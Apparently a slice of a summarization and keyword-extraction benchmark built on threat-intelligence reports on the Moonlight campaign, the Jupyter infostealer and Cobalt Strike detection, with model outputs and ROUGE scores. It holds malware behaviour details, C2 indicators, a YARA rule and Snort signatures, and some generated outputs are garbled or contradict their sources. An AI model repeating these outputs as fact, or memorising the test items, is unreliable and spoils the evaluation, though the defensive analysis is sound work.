with attachments or links that have .exe extensions disguised as legitimate files. The decoy documents have themes relevant to Middle Eastern politics. The attackers use the H-Worm malware as a first stage backdoor, delivering it via shortened URLs and domains impersonating Middle Eastern media groups. Later stages install the Remote Access Trojan (RAT) njRat to maintain persistence. The malware samples show evidence of manual creation rather than automated build processes. The command and control infrastructure consists of dynamic domains controlled via home internet connections in the West Bank of Palestine. Over 200 varied malware samples were identified. Earlier attacks were more opportunistic, but later attacks specifically targeted groups and individuals. The tools and targets indicate a possible connection to the Gaza Hacker Team. The attacks demonstrate that zero-days and exploits are not required for successful compromises. Instead, the group relies on basic scripts and obfuscation of known malware. The security implications are significant given the political motivations, even if the technical sophistication is low. The attacks could enable espionage and loss of life between rival factions. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5352798053527981, "gpt3/lexical/rouge_rouge2": 0.20537897310513448, "gpt3/lexical/rouge_rougeL": 0.2287104622871046, "gpt3/lexical/rouge_rougeLsum": 0.2287104622871046, "gpt3_generated_text": ["Researchers at Vectra Threat Labs have discovered a group of individuals conducting targeted cyber attacks in the Middle East. Over the past two years, the group, known as Moonlight, has generated over 200 samples of malware. The attacks are focused on Middle Eastern political issues and appear to be driven by espionage motives rather than opportunistic or criminal intentions. While the attackers are not technically sophisticated, they use some innovative tactics. Moonlight's targets include Palestinian news organizations and individuals connecting from home networks in the Middle East. The group's malware is disguised as documents of interest to their victims and often references Middle Eastern politics. The attacks do not require zero-day exploits, instead relying on social engineering techniques such as phishing emails with malicious attachments or links. Vectra Networks has worked with providers to sinkhole Moonlight's command and control infrastructure. While some similarities exist between Moonlight and the Gaza Hacker Team, no firm links have been identified between the two groups. Attribution of the attacks to specific threat actors remains unclear."]}, {"split_name": "test", "sample_id": "test_106", "prompt_text": "Extract the keywords: INFOSTEALERIntroduction 3Inno Setup Attack Phase 4C2 [PERSON] Jupyter [PERSON] Client 6PowerShell Intermediate Loader [DATE] 13Jupyter [DATE] Infostealer [DATE] 13Conclusion [DATE] 16IOCS [DATE] 16About [ORG] MORPHISEC 182INTRODUCTION An [ORG] Infostealer is a trojan that is designed to gather and exfiltrate private and sensitive information from a target system . There is a large variety of info stealers active in the wild , some are independent and some act as a modular part of a larger task such as [ORG] a [ORG] Banking [ORG] Trojan ( [PERSON] Trickbot ) or a [ORG] RAT . Infostealers are usually lightweight and stealthy payloads that do not have persistence or propagation ( get - in and get - out ) capabilities . This type of trojan is particularly difficult to detect as it leaves an extremely small footprint . During what began as a routine incident response process , [PERSON] Morphisec has identified ( and prevented ) a new .NET infostealer variant called Jupyter . [PERSON] Morphisec discovered this variant as part of assisting a higher education customer in the [GPE] U.S. with their incident response . Jupyter is an infostealer that primarily targets Chromium , Firefox , and [ORG] Chrome browser data . However , its attack chain , delivery , and loader demonstrate additional capabilities for full backdoor functionality . These include : \u2022 a [CARDINAL] C2 client \u2022 download and execute malware \u2022 execution of [ORG] PowerShell scripts andcommands\u2022 hollowing shellcode into legitimate windows configuration applications . Jupyter \u2019s attack chain typically starts with a downloaded zip file that contains an installer , an executable that usually impersonates legitimate software such as Docx2Rtf . Some of these installers have maintained0 detections in [ORG] VirusTotal over [DATE] the [DATE] last [DATE] 6 [DATE] months , making it exceptional at bypassing most endpoint security scanning controls . Upon execution of the installer , a .NET [CARDINAL] C2 client ( [PERSON] Jupyter [PERSON] Loader ) is injected into a memory . This client has a well defined communication protocol , versioning matrix , and has recently included persistence modules . The client then downloads the next stage , a [ORG] PowerShell command that executes the in - memory Jupyter .NET module . Both of the .Net components have similar code structures , obfuscation , and unique UID implementation . These commonalities indicate the development of an end to end framework for implementing the Jupyter Infostealer . [PERSON] Morphisec has monitored a steady stream of forensic data to trace multiple versions of Jupyter starting in [DATE] May [DATE] 2020 . While many of the C2s are no longer active , they consistently mapped to [GPE] Russia when we were able to identify them . This is not the only piece of evidence that this attack is likely [NORP] Russian in origin . [ORDINAL] First , there is the noticeable [LANGUAGE] Russian to [LANGUAGE] English misspelling of the planet name . Additionally , [PERSON] Morphisec researchers ran a reverse [PRODUCT] Google [PRODUCT] Image search of the [CARDINAL] C2 admin panel image and were not surprised to find the exact image on [LANGUAGE] Russian - language forums . This report details the changes and evolution of the Jupyter infostealer and its backdoor component.3INNO SETUP ATTACK PHASEInno Setup , a free software - script driven installation system with many legitimate uses , is leveraged as the [ORDINAL] first stage of the attack . The Inno Setup executable usually comes as a zipped file and has a low detection rate in [ORG] VirusTotal . Figure [CARDINAL] 1 : [PERSON] Inno Setup \u2019s detection in [ORG] Virus [ORG] Total . In order to deceive the victim , and convince them to open the executable , it uses [ORG] Microsoft [ORG] Word icons and names , such as:\u2022\u2022\u2022\u2022The - Electoral - Process - Worksheet - Key.exeMathematical - Concepts - Precalculus - With - Applications - Solutions.exeExcel - Pay - Increase - Spreadsheet - Turotial - Bennett.exeSample - Letter - For - Emergency - Travel - DocumentFigure 2 : Detection antivirus results.4When running , the installer executes legitimate tools such as Docx2Rtf , [ORG] Magix [ORG] Photo Manager ( view and edit photos ) , etc . In the background it drops [CARDINAL] two files to a temporary directory . [CARDINAL] One file is a [ORG] PowerShell script that is executed by the malicious installer . This [ORG] PowerShell script reads the [ORDINAL] second file , and then decrypts and runs it as the next stage . Figure [CARDINAL] 3 : The [ORG] PowerShell script . When running , the installer executes legitimate tools such as Docx2Rtf , [ORG] Magix [ORG] Photo Manager ( view and edit photos ) , etc . The decoded [ORG] PowerShell drops [CARDINAL] two files in a random directory in [ORG] the [ORG] Application [ORG] Data [ORG] Folder . Once again , one file is responsible for decrypting the other . This time it \u2019s a [ORG] CMD batch script that executes [ORG] PowerShell to decrypt the in - memory managed .NET assembly and run it . Additionally , it uses the PoshC2 persistence method in newer versions of the installer . It creates a [ORG] LNK file and places it directly in the Windows startup folder for persistence . Figure [CARDINAL] 4 : PoshC2 persistency5C2 JUPYTER [GPE] CLIENT INTRODUCTIONAs mentioned previously , Jupyter \u2019s client is a highly maintained component . Progressively upgraded versions have been leveraged over [DATE] the [DATE] last [DATE] five [DATE] to [DATE] six [DATE] months , and [PERSON] Morphisec researchers have identified [CARDINAL] more [CARDINAL] than [CARDINAL] nine version upgrades in [DATE] a [DATE] single [DATE] month . The following analysis will cover the different updates that were introduced to the protocol , unique ID computation , and the various capabilities that have been added and removed . VERSIONS : DN - DN/1.2 : Creation date : 2020 - 05 - 11 SHA-1 : [CARDINAL] 26AF2E85B0A50BF2352D46350744D4997448E51D This was the [ORDINAL] first version seen in the wild . It holds the C2 address and its version as variables and collects information from the infected machine such as : Computer name , OS version , architecture , permissions , UID.Figure [CARDINAL] 5 : Version DN - DN/1.2 of [PERSON] Jupyter . The Unique Identifier ( HWID ) is generated based on the user name , computer name , and physical media serial number.6Figure [CARDINAL] 6 : How the Unique ID is generated . The information is converted to bytes and sent as part of the GET request . The version of the loader that is used is based on information about the victim . The options for the next stage are : \u2022 Drop and Execute a [ORG] PowerShell script \u2022 [ORG] Drop and [ORG] Execute application \u2022 [PRODUCT] Drop and Inject a shellcode into a [ORG] Microsoft legitimate process , \u201c msinfo32.exe , \u201d using a standard [ORG] ProcessHollowing technique . Figure [CARDINAL] 7 : Options for the next stage . The payload ( [ORG] PowerShell , executable , or shellcode ) retrieved from the [CARDINAL] C2 is decoded using [WORK_OF_ART] XOR with a decimal number.7Figure [CARDINAL] 8 : The payload is decoded . DN - DN/1.7 : [DATE] Creation [DATE] date : [DATE] 2020 - 06 - [DATE] 21 This version added the [ORG] Workgroup to the collected information . Figure [CARDINAL] 9 : [ORG] Workgroup is added to the information being [ORG] collected.8It also added a [ORG] FingerPrint class that generates the [ORG] UID ( [ORG] HWID ) based on the following properties . Figure [CARDINAL] 10 : The [ORG] FingerPrint class is added . DN - DN / FB1 : Creation date : [DATE] 2020 - 09 - 24 This version removed the [ORG] FingerPrint class and added [ORG] LdrConfig class that holds the loader configuration ( C2 address and loader version).The UID ( [ORG] HWID ) is generated based on [CARDINAL] 32 random bytes and saved to the disk as solarmarker.dat . Figure [CARDINAL] 11 : The [ORG] LdrConfig class is added.9Figure [CARDINAL] 12 : The [ORG] UID is saved as solarmarker.dat . DR/1.0 : Creation date : [DATE] 2020 - [DATE] 10 - 05 In this version , the Process Hollowing option was removed for a new option \u2013 a get [ORG] PowerShell command to run in - memory . It also changed the version naming convention from DN - DN to [GPE] DR and added a [ORG] XOR key to the configuration class . Figure [CARDINAL] 13 : [ORG] Process [ORG] Hollowing is replaced by \u201c get [ORG] PowerShell . \u201d10There are also the additional JSON classes in order to parse the new communication protocol . All of the requests to and from the C2 are base64 decoded / encoded and [ORG] XORed with the pre - configured key . This new protocol is added to the victim \u2019s collected information as [ORG] protocol_version:1 with a new key called action that indicates to the C2 which stage it \u2019s in . The above [PERSON] JSON is sent with the action \u201c ping , \u201d and as a response it gets the following JSON : Figure [CARDINAL] 14 : The encoding of the new protocol.{\u201cstatus \u201d : < status > , \u201c type \u201d : < attack_type > , \u201c task_id \u201d : < task_id>}.\u2022\u2022\u2022\u201cstatus \u201d : file , command or idle . \u201ctype \u201d : ps1 , exe . \u201ctask_id \u201d : ID of the current attack.11In the case of \u201c status\u201d:\u201ccommand , \u201d the powershell command will be retrieved and run without writing the command to disk . If \u201c type \u201d is \u201c ps1\u201d/\u201cexe , \u201d a random named powershell / exe file will be created in the Temp directory . Then , the following request will be sent to the C2 to get the powershell command:{\u201caction\u201d:\u201dget_file\u201d,\u201dhwid\u201d:<hwid>,\u201dtask_id\u201d:<task_id>,\u201dprotocol_version\u201d:1 } . The command is then written to the previously created random file and executed . This stage will be discussed in a subsequent section . While the next stage is running , another request gets sent to the C2 with the action : { \u201c action\u201d:\u201dchange _ status\u201d,\u201dhwid\u201d:<hwid>,\u201dtask_id \u201d : < task_id>,\u201dis_success\u201d:true,\u201dprotocol_version\u201d:1}.This indicates that the next stage is running successfully . The response is then { \u201c status \u201d : \u201c idle \u201d } , which enters the process to a loop waiting for the next commands . DR/1.1 : Creation date : [DATE] 2020 - [DATE] 10 - [DATE] 13 In this phase , the creators added the domain name into the information they \u2019re seeking to collect . All the other collected information remains the same ; they have n\u2019t deleted anything or changed anything else from the previous version . Figure [CARDINAL] 15 : The domain name is added.12DR/1.4 : Creation date : [DATE] 2020 - [DATE] 11 - 03 There were no significant or interesting changes from version DR/1.1 POWERSHELL INTERMEDIATE LOADER In most cases , based on the availability of active C2 connections , the next stage is a [ORG] PowerShell script that is downloaded by the Jupyter C2 client as described in a previous section . The [ORG] PowerShell script holds a base64 encoded blob and a XOR key that is similar to the previously mentioned [ORG] PowerShell scripts . It decrypts the base64 blob ( another .NET assembly ) and , once again , runs it in - memory . Figure [CARDINAL] 16 : The [ORG] PowerShell intermediate loader . JUPYTER INFOSTEALERINTRODUCTIONThe decrypted .NET assembly blob is the Jupyter infostealer . It has a different C2 address and different version number adhering to the patterns of the [CARDINAL] C2 client . It also implements similar obfuscation patterns . Figure [CARDINAL] 17 : The Jupyter infostealer .NET assembly blob . Initially [PERSON] Morphisec researchers identified that all the infostealer payloads had the same namespace , Jupyter . Later , they traced the random DLLs to the original [ORDINAL] first version of Jupyter and identified that it was its original13filename . Furthermore , it looks like the adversaries have a special interest in the planet [LOC] Jupiter as an image of the planet is found on the main page of the admin panel accessed by the infostealer . As stated in the introduction , the image was most likely extracted from a [LANGUAGE] Russian - language forum , which was n\u2019t a big surprise considering the fact that all the investigated C2s point back to [GPE] Russia . VERSIONS : CS - DN/1.3 : Creation date : [DATE] 2020 - 06 This is the [ORDINAL] first version seen in the wild of the infostealer . Stealing information ( autocomplete , cookies , and passwords ) only from [ORG] Chrome browsers , it uses the same [ORG] FingerPrint class mentioned in the previous stage to get the UID.Figure [CARDINAL] 18 : Jupyter version CS - DN/1.3.It copies the stolen information to another directory , and then reads the information from there to avoid triggering alerts . This allows it to evade defenses and continue on to achieving the attacker \u2019s ultimate goal of exfiltration . Figure [CARDINAL] 19 : Jupyter \u2019s defense evasion.14CS - DN/1.8 : Creation date : [DATE] 2020 - [DATE] 10 - 07 This version added Firefox information stealing ( cookies , logins , certificates , and form history ) . This version uses the same technique of copying the stolen information before accessing it to evade detection . Figure [CARDINAL] 20 : [PERSON] Jupyter added Firefox information stealing . All of the stolen information is sent to the configured C2 , which is different from the loader . At the time of writing this , the admin panel was still active . Figure [CARDINAL] 21 : The admin panel.15CONCLUSION Every version of the Jupyter infostealer adds yet another unknown element to the attack so that detection- centric solutions can be evaded and continuously bypassed . As our analysis shows , the infostealer creator constantly changes the code to collect more information and more efficiently evade detection without causing alerts . Jupyter and similarly evolving attacks make clear the fundamental issue with detection - centric tools because they show that the adversary can consistently iterate on their attack to stay ahead of the defender . [ORG] Morphisec customers are secured against unknown attacks like this without needing to detect any portion of the attack chain through the [CARDINAL] zero trust runtime environment created by our moving target defense technology . IOCS description = \u201c Rule to detect [PERSON] Jupyter [PERSON] Infostealer \u201d author = \u201c [PERSON] Morphisec labs strings : $ uid = \u201c \\\u201dhwid\\ \u201d : \u201d wide $ version_loader1 = \u201c DR/ \u201d wide $ version_loader2 = \u201c DN - DN/ \u201d wide $ version_jupyter = \u201c CS - DN/ \u201d wide condition : uint16(0 ) = = [MONEY] 0x5A4D [MONEY] and [MONEY] $ uid and [CARDINAL] 1 of ( $ version * ) C2:\u2022\u2022\u2022\u2022\u2022\u202245.135.232[.]13145.146.165[.]22245.146.165[.]21991.241.19[.]21gogohid[.]comspacetruck[.]biz\u2022 blackl1vesmatter[.]org\u2022 [ORG] Mixblazerteam[.]com\u2022vincentolife[.]com / j\u2022 On - offtrack[.]biz17ABOUT [PRODUCT] MORPHISECMorphisec delivers an entirely new level of innovation to customers with its patented Moving Target Defense technology - placing defenders in a prevent - [ORDINAL] first posture against the most advanced threats to the enterprise , including APTs , [DATE] zero - days , ransomware , evasive fileless attacks and web - borne exploits . [PERSON] Morphisec provides a crucial , smallfootprint memory - defense layer that easily deploys into a company \u2019s existing security infrastructure to form a simple , highly effective , cost - efficient prevention stack that is truly disruptive to [DATE] today \u2019s existing cybersecurity [ORG] model.18", "generated_text": "the Inno Setup attack; malware; a.NET infostealer; primarily targets Chromium; Firefox; Chrome browser data; its attack chain; a C2 client; download; shellcode; PowerShell scripts; commands; the data; a backdoor; a DLL; the.NET component; persistence; obfuscation; the C2 admin panel; the victim; the C2 infostealer; a zipped file; a high detection rate; a system; detections; Russian; the C2 admin panel image; a re-entry; the initial access; the attacker; the malware; the C2 admin panel; the C2 client; a zipped file; the installer; the C2 client; PowerShell commands; the C2 client; commands; detection; a command; the C2 server; the key; an address.", "ref_text": "<START-1>The report by Morphisec analyzes a new .NET infostealer malware called Jupyter discovered during an incident response investigation. Jupyter primarily targets Chromium, Firefox, and Chrome browser data, but also has backdoor capabilities. The attack starts with a downloader executable that impersonates legitimate software. It executes a .NET C2 client that can download additional payloads, run commands, and hollow code into system processes. The C2 uses a protocol with versioning and unique victim IDs. The C2 retrieves a PowerShell loader that decodes and runs the Jupyter infostealer payload. Jupyter exfiltrates browser data like cookies and credentials back to a command server. It copies data before accessing it to avoid detection. Jupyter has evolved through multiple versions since May 2020 to add capabilities like Firefox data theft, Windows startup folder persistence, and new communications protocols. Code analysis indicates it originates from a Russian developer. Morphisec concludes that Jupyter's constant evolution demonstrates the limitations of detection-based security tools. The company's moving target defense approach protects against these advanced unknown threats without needing to detect the attack chain. The report provides IOCs, YARA rules, and details on Jupyter's multi-stage attack process to help identify infections. Jupyter exemplifies sophisticated modular info stealers that evade defenses by frequently changing tactics. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4581005586592179, "gpt3/lexical/rouge_rouge2": 0.15168539325842698, "gpt3/lexical/rouge_rougeL": 0.24581005586592178, "gpt3/lexical/rouge_rougeLsum": 0.24581005586592178, "gpt3_generated_text": ["This article discusses a new.NET infostealer variant called Jupyter, which primarily targets Chromium, Firefox, and Chrome browser data. The attack chain of Jupyter involves a C2 client, the download and execution of malware, the execution of PowerShell scripts and commands, and the hollowing of shellcode into legitimate Windows configuration applications. The attack starts with a downloaded zip file containing an installer that impersonates legitimate software. The installer injects the Jupyter C2 client into memory, which then downloads a PowerShell command to execute the in-memory Jupyter.NET module. The article also mentions that the C2s associated with Jupyter have been traced back to Russia. The article highlights the use of Inno Setup as the initial stage of the attack, which has a low detection rate in VirusTotal. Overall, Jupyter is a stealthy and sophisticated infostealer that is difficult to detect and has the potential for full backdoor functionality."]}, {"split_name": "test", "sample_id": "test_107", "prompt_text": "Extract the keywords: The art and science of detecting Cobalt StrikeBY NICK MAVISEDITED BY [PERSON] JOE [PERSON] MARSHALL AND [ORG] JON MUNSHAWUpdated [DATE] September [DATE] 11 , [CARDINAL] 2020talos-external@cisco.com | talosintelligence.compage [CARDINAL] 1 of 29TABLE OF CONTENTS Introduction 3 Getting up to speed [CARDINAL] 3 Listeners 3 Web management 4 Reporting 5 Attack analysis 5 Target Module : Raw Shellcode generator [CARDINAL] 5 [ORG] Target module : [ORG] Staged / stageless executable generator [CARDINAL] 8 C2 Communication 10 Target Module : HTML application attack generator [CARDINAL] 13 Target Module : Scripted web delivery [CARDINAL] 16 Target Module : Signed Java Applet Attack [CARDINAL] 17 Target Module : Smart Java Applet Attack [CARDINAL] 18 [ORG] Target module : System profiler [CARDINAL] 24 Conclusion 26 Appendix A : Coverage [CARDINAL] 27 Staged / Stageless Executables [CARDINAL] 27 Scripted Web Delivery PowerShell [CARDINAL] 27 [EVENT] Beacon [EVENT] Binary [EVENT] Payloads [EVENT] 27 Beacon [ORG] PowerShell payloads [CARDINAL] 27 [ORG] HTML [ORG] Application [ORG] ( [ORG] HTA ) Attacks [CARDINAL] 27 Cobalt Strike signed applet attack [CARDINAL] 28 Cobalt Strike smart applet attack [CARDINAL] 28 Cobalt Strike system profiler attack [CARDINAL] 28talos-external@cisco.com | talosintelligence.compage 2 of 29INTRODUCTION Cobalt Strike is ubiquitous in the cyber security arena . It \u2019s a prolific toolkit used at many levels of intrusion to solve adversaries ' problems like post - intrusion exploitation , beaconing for command and control ( C2s ) , stealth and reconnaissance . Cobalt Strike is a modularized attack framework : Each module fulfills a specific function and stands alone . It \u2019s hard to detect , because its components might be customized derivatives from another module , new , or completely absent . Malicious actors find [PERSON] Cobalt [PERSON] Strike \u2019s obfuscation techniques and robust tools for C2 , stealth and data exfiltration particularly attractive . [PERSON] Cisco [PERSON] Talos recently updated its [ORG] SNORT \u00ae and [ORG] ClamAV \u00ae signatures to detect [PERSON] Cobalt [PERSON] Strike , version [CARDINAL] 4.0 , a common platform utilized as [CARDINAL] one part of attack processes . This paper outlines the challenges we were confronted with when analyzing [PERSON] Cobalt [PERSON] Strike , and the ways we crafted our detection . We will address all the modules we \u2019ve updated coverage for , how we analyzed and thought about detection and the signature that resulted . GETTING UP TO SPEED Cobalt Strike is a paid penetration - testing tool that anyone can use . Malicious actors have used it for [DATE] years to deploy \u201c Listeners \u201d on victim machines . In this paper , we \u2019ll dive into some of the core components of Cobalt Strike and then break down our analysis of these components and how we can protect against them . We will also look at Cobalt Strike from the adversary \u2019s perspective . LISTENERS Listeners are at the core of Cobalt Strike . They allow adversaries to configure the [CARDINAL] C2 method used in an attack . Every attack or payload generated in Cobalt Strike requires the targeted user to select a [PERSON] Listener to embed within it . This will determine how an infected host will reach out to the [CARDINAL] C2 server to retrieve additional payloads and instructions . When creating a listener , the user can configure the payload type , name , [CARDINAL] C2 server and port , and other various options such as named pipes or proxy servers ( Figure [CARDINAL] 1 ) . Users can Potentially the most powerful aspect of Cobalt Strike is the array of malleable [CARDINAL] C2 profiles , which allows users to configure how attacks are created , obfuscate and manage the flow of execution at a very low level . There are several ways to visualize how an adversary interacts with infected Cobalt Strike hosts , such as a session table , pivot graph , or a target table . In Figure [CARDINAL] 2 , you can see the session table , along with some options available when selecting a host . Figure [CARDINAL] 1 : Cobalt Strike Listener consoletalos-external@cisco.com | talosintelligence.compage [CARDINAL] 3 of 29Figure 2 : Cobalt Strike session tableHowever , this does not give insight into how the hosts are interconnected , nor the C2 path taken when contacting the Cobalt Strike C2 . For that , we can swap to [ORG] the [ORG] Pivot [ORG] Graph ( Figure [CARDINAL] 3).In Figure [CARDINAL] 3 , the ` WIN-498IQCJRIUQ ` host is connected through \u201c DESKTOP - R8VN37V \u201d and all [CARDINAL] C2 operations are executed using that path . Listeners that are designed only to connect infected hosts laterally include the [ORG] SMB and [ORG] TCP beacons . Attackers can also control hosts through the interactive beacon console . This allows for more advanced control of a host . [ORG] WEB [ORG] MANAGEMENT [ORG] Cobalt Strike delivers exploits and/or malicious payloads using an attacker - controlled web server . The web server can be configured to perform the following actions : \u2022 Host files \u2022 Clone an existing website to trick users \u2022 Scripted web delivery \u2022 Signed [PERSON] Applet [PERSON] Attack ( Java ) \u2022 Smart Applet Attack ( Java ) \u2022 System profilingFigure 3 : Cobalt Strike Pivot TableFigure 4 shows how an adversary would manage the \u201c Sites \u201d console from their end . In this example , we \u2019re hosting a malicious [ORG] PowerShell script on the \u2018 /malware \u2019 [ORG] URI over port 80.You can also see that the HTTP based listeners are also present as they are used to deliver additional payloads and [CARDINAL] C2 commands to victims . When a victim reaches out to the Cobalt Strike web server , it \u2019s logged for operators . Figure [CARDINAL] 4talos-external@cisco.com | talosintelligence.compage [CARDINAL] 4 of 29Figure 5 : Cobalt Strike payload generated with x86 HTTP Listener . REPORTING Cobalt Strike offers a variety of report generators to get a complete breakdown of the infected hosts and associated data . Available options include : \u2022 Social engineering report \u2022Indicators of compromiseTactics , techniques and proceduresATTACK ANALYSISTARGET MODULE : RAW SHELLCODE GENERATOR Cobalt Strike generates raw , malicious payloads that an attacker could implement into other attacks . The payload can be generated as raw shell code or preformatted inalmost any language desired , including [ORG] PowerShell , Python and [PERSON] Java , among many others . When generating raw payloads , the user is presented with only the HTTP , [ORG] HTTPS and [ORG] DNS beacons to choose from . The generated payload can act as a staging payload for the Cobalt beacon , to be plugged into an exploit of their choice . For analysis , we only concentrated on the x86 and x64 binary payloads generated in C. No matter the code selected , the resulting payload is n\u2019t designed to execute by itself . The generator \u2019s primary function is to format the shell code in a way that allows the user to drop in a [ORDINAL] third - party exploit or custom exploits and have it preformatted in that particular programming language . Figure [CARDINAL] 5 shows a payload generated with the x86 HTTP listener . EXECUTION Since the payload is only a bunch of raw bytes , it wo n\u2019t just run if a user double - clicked the file . The adversary would have to load the shellcode and jump to the desired entry point . This is trivial \u2014 we can use a quick C script thattalos-external@cisco.com | talosintelligence.compage [CARDINAL] 5 of 29loads the desired shellcode and then executes it as if it were a function . This enables defenders to quickly analyze shell code in some cases without having to perform any over- the - top attempts to load it ( Figure [CARDINAL] 6).Once the buffer is allocated and called , we can see the start of the Cobalt Strike shellcode in Figure [CARDINAL] 7.It starts with a common shellcode instruction ` cld ` , which is used to make sure strings are processed from left to right by clearing [ORG] the [ORG] Direction [ORG] Flag [ORG] ( DF ) . Then , we immediately call the [ORDINAL] first function to import \u201c wininet.dll \u201d ( Figure 8).Immediately , we can see a string for \u201c wininet \u201d , and a [QUANTITY] four - byte hex value pushed onto the stack , and an indirect register call on ` ebp ` , which currently points to the [ORDINAL] first instruction after ` shellcode_main ( ) ` [ shellcode _ main+0x6].The shellcode is unaware of the libraries it needs to execute and needs to import them . This technique is often used by malware to obfuscate calls to the Windows API by resolving imports using a hash of the function . This one , in particular , is a modified version of [GPE] Metasploit 's \u201c reverse_http \u201d shellcode ( Figure [CARDINAL] 9).Figure [CARDINAL] 10 shows a pointer to the Process Environment Block ( PEB ) and the PEB_LDR_DATA data structure within . This target is the ` InMemoryOrderModuleList , ` which contains a list of all modules loaded in memory . By traversing this list , we can also get a list of functions available within each module . Cobalt Strike iterates over each [ORG] DLL , converts the full name to lowercase and begins to calculate a hash value of each export using the full [ORG] DLL name and the desired functionFigure [QUANTITY] 6Figure [QUANTITY] 7Figure 8Figure [CARDINAL] 9talos-external@cisco.com | talosintelligence.compage [DATE] 6 [DATE] of [DATE] 29name . The hashing algorithm used is a simple ROR13 , the same one used by [GPE] Metasploit . The retrieved [ORG] DLL [ORG] + [ORG] Function name is compared to a calculated hash against the hex value ( 0x726774C ) passed in earlier as an argument to ` call_by_hash ( ) ` . If the match is successful , Cobalt Strike calls that function immediately with the other arguments passed . Figure [CARDINAL] 11 shows the relevant functionality from [ORG] the [ORG] Metasploit \u2019s [ORG] ` hash.py:`The payload makes an outbound HTTP call to the configured HTTP C2 server . The Cobalt Strike C2 server responds with an HTTP 200 OK , containing a very large binary blob . This blob is the core functionality of Cobalt Strike , better known as \u201c beacon.dll . \u201d From here on out , this is the code that will be used to control an infected host . After retrieving the [ORG] DLL , it is loaded via a technique called Reflective DLL injection . DETECTION Now that we have a good understanding of how a Cobalt Strike payload works , we can work on creating detection for these payloads . The goal when creating detection content is to cover something in its entirety , with the fewest rules , without triggering false positives . This , for the most part , ensures we are creating generic detection rather than something that only targets [CARDINAL] one thing . At [ORG] Talos , we want our detection to catch variants and potential future threats . When looking into coverage for the Cobalt Strike payloads , we found weFigure 10Figure [CARDINAL] 11talos-external@cisco.com | talosintelligence.compage [CARDINAL] 7 of 291:15306:22 1:11192:20 1:30471:3 [CARDINAL] 1:30229:3had some prior coverage alerting on the payloads , including these [ORG] Snort rules : The [ORDINAL] first [CARDINAL] two are generic file type detection rules that are the base for setting flowbits in [GPE] Snort and can be ignored . However , SIDs 1:30471 and 1:30229 are [GPE] Metasploit shellcode rules we released [DATE] years [DATE] ago that still apply here . At the time , these rules were suspected to be false positive prone and were not enabled by default in policy . We ca n\u2019t narrow them down to a specific type or protocol . Therefore , we have to remove a lot of checks that tell [GPE] Snort whether or not to inspect a packet further and re - enabled them . The key element here is the [ORG] Snort header , ` alert tcp any any - > any any ` . Most [PERSON] Snort rules will declare a traffic direction ( coming from or going to the user \u2019s network ) and the applicable port ranges . Since this raw shellcode can be used with potentially any exploit over an unknown protocol or port , we ca n\u2019t narrow it down to inspection on for example just port [CARDINAL] 80 . We also do n\u2019t know if a host is compromised already and attempting to move laterally , so we ca n\u2019t specify the source and destination networks . This means that [ORG] Snort will attempt to match this particular byte sequence on all [ORG] TCP traffic crossing the sensor . Not only is this undesirable for performance reasons , it heightens the potential for false positives . We need to be a little more cautious when releasing a catch - all rule such as this . The following [ORG] Snort rule also helped in detecting reverse shell sessions from metasploit \u2022[1:30480:3 ] INDICATOR - SHELLCODE Metasploit pay- load windows_x64_meterpreter_reverse_httpsAfter analyzing the preexisting [ORG] Snort rules , the only thing left to cover is the outbound HTTP request and the binary blob [PRODUCT] Cobalt [PRODUCT] Strike retrieves from the C2 server . Typically , covering the initial outbound HTTP GET would be ideal since we want to identify potential [CARDINAL] C2 traffic as fast as possible and flag the host as compromised in [ORG] Cisco [ORG] Firepower [ORG] NGFW . However , the [ORG] URI code we used in our research could be anything and was always random in samples . The HTTP Header fields were also unhelpful , since there was n\u2019t anything unique enough to distinguish the request apart from benign traffic . This leaves us with onlythe HTTP response containing the binary blob . The shellcode started similarly to the raw payload with a ` cld ` instruction followed by a short function designed to decrypt the rest of the payload with an operator configured [PERSON] XOR key . Since we do n\u2019t want to target encrypted data with our detection , we used the start of the shellcode as the detection target . This resulted in [CARDINAL] two new rules , both looking for the same thing across different listeners . \u2022[1:53757:1 ] MALWARE - OTHER CobaltStrike beacon.dll download attempt [ [CARDINAL] 1:53758:1 ] MALWARE - OTHER CobaltStrike beacon.dll download attempt\u2022TARGET MODULE : STAGED / STAGELESS EXECUTABLE GENERATOR This module will encompass both staged and stageless [PERSON] Cobalt [PERSON] Strike beacons . This is the core component delivered to a victim host and establishes persistence , [CARDINAL] C2 communication , and any further execution on the host . Beacons are extremely versatile and expose a huge number of features for operators . Staged vs. [ORG] Stageless Stageless payloads are delivered to the victim all at once . Typically , a stageless payload already contains a large variety of malicious functionality and will not require additional resources to infect the victim . Staged payloads are usually small , malicious payloads that are used to load a larger , more robust payload . This allows an attacker to transfer a small binary to a targeted host and retrieve the desired payload afterward . Stagers are designed to be as small as possible so that they can be delivered using different techniques and leave less of a footprint . Having a smaller initial payload with less functionality is more likely to evade AV detection by appearing to be benign . A stager can then grab the larger payload for more functionality and load it directly into memory . Stagers allow adversaries to embed your payloads in different methods . An adversary could take staged code and send it in an exploit with resource limitations on the target.talos-external@cisco.com | talosintelligence.compage [CARDINAL] 8 of 29Beacon options Generating a beacon payload can result in a few different types of executable files \u2014 each of them embedded with a [PERSON] Listener and architecture of your choice . This will generate an ` artifact.exe ` file to save on disk . How it \u2019s used from there is up to the operator . \u2022 Raw ( [ORG] Stageless only ) [ORG] \u2022 [ORG] Windows [ORG] EXE [ORG] \u2022 [ORG] Windows [ORG] Service [ORG] EXE [ORG] \u2022 [ORG] Windows [ORG] DLL ( [CARDINAL] 32 bit ) \u2022 Windows DLL ( [CARDINAL] 64 bit)Staged After startup , Cobalt Strike spawns a new thread designed to construct a named pipe for further execution . For the purposes of research , we opted to utilize a [CARDINAL] 32 bit executable with a reverse HTTP listener . Figure [CARDINAL] 12 shows a format string that calls to ` sprintf ( ) ` with the default structure of the named pipe . The [CARDINAL] four - digit number is a randomly generated number but we can see that in a default configuration , the name has a static structure like \u201c \\\\\\\\.\\\\pipe\\\\MSSE-6722 - server . \u201dFollowing thread creation , the named pipe is created and a connection is initiated . The goal of this is to process additional shellcode embedded within the binary by writing it to the named pipe thread . This pipe is decrypted using a rolling [PERSON] XOR against the data . The default XOR key for this particular payload is 0xE3F4C314 . After decryption is complete , another thread is created that immediately jumps to and executes the shellcode ( Figure [CARDINAL] 13).Figure [CARDINAL] 12Figure [CARDINAL] 13talos-external@cisco.com | talosintelligence.compage [CARDINAL] 9 of 29Figure 14Stageless [ORG] Stageless operates in the same way a staged payload does \u2014 it still spawns a 